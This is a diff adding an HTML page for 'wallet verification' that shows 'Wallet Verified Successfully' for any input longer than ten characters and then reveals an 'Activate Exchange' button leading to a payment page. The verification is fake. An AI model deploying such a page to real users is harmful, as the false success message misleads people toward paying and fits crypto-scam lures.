@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* Maintain previous color scheme */
+        :root {
+            --primary: #713d92;
+            --secondary: #FFA500;
+            --background: #f0e6ff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #FFFFFF;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            color: var(--primary);
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+        }
+
+        .input-container {
+            margin: 40px 0;
+            position: relative;
+        }
+
+        .wallet-input {
+            width: 100%;
+            padding: 15px 45px 15px 20px;
+            border: 2px solid #d3c0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: var(--primary);
+            transition: all 0.3s ease;
+        }
+
+        .wallet-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 8px rgba(113, 61, 146, 0.2);
+        }
+
+        .verification-message {
+            display: none;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            animation: slideDown 0.3s ease;
+        }
+
+        .cta-button {
+            background: var(--secondary);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .cta-button.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .cta-button:hover {
+            background: #ff8c00;
+            transform: translateY(-2px);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 3px;
+            background: var(--primary);
+            margin-top: 10px;
+            transition: width 2s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-wallet"></i>
+        </div>
+
+        <h2 style="color: var(--primary); margin-bottom: 15px;">Wallet Verification</h2>
+        <p style="color: #666; margin-bottom: 30px;">Enter your wallet address to verify ownership</p>
+
+        <div class="input-container">
+            <input 
+                type="text" 
+                class="wallet-input" 
+                placeholder="Enter wallet address"
+                id="walletAddress"
+            >
+            <i class="fas fa-qrcode input-icon"></i>
+            <div class="progress-bar"></div>
+        </div>
+
+        <div class="verification-message" id="verificationMessage">
+            <i class="fas fa-check-circle"></i> Wallet Verified Successfully
+        </div>
+
+        <button class="cta-button" id="activateButton" onclick="window.location.href='payment.html'">
+            Activate Exchange
+        </button>
+    </div>
+
+    <script>
+        const walletInput = document.getElementById('walletAddress');
+        const verificationMessage = document.getElementById('verificationMessage');
+        const activateButton = document.getElementById('activateButton');
+        const progressBar = document.querySelector('.progress-bar');
+
+        walletInput.addEventListener('input', (e) => {
+            if(e.target.value.length > 10) {
+                // Simulate verification process
+                progressBar.style.width = '100%';
+                
+                setTimeout(() => {
+                    verificationMessage.style.display = 'flex';
+                    progressBar.style.width = '0%';
+                    
+                    // Show CTA after verification
+                    setTimeout(() => {
+                        activateButton.classList.add('show');
+                    }, 500);
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
